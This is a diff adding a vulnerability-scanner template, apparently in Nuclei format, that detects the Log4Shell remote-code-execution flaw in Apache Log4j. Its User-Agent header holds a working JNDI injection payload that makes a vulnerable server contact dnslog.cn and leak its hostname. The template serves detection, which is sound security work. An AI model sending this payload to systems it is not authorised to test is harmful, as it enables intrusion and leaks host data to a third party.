@@ -1,0 +1,24 @@
+id: log4shell-rce
+
+info:
+  name: Apache Log4j RCE (Log4Shell)
+  author: custom-adapter
+  severity: critical
+  description: Detects Log4j vulnerability via JNDI lookup in headers.
+  reference: CVE-2021-44228
+  tags: rce,log4j
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+    headers:
+      User-Agent: "${jndi:ldap://${hostName}.dnslog.cn/a}"
+    matchers-condition: and
+    matchers:
+      - type: dns
+        dns:
+          - "dnslog.cn"
+      - type: status
+        status:
+          - 200
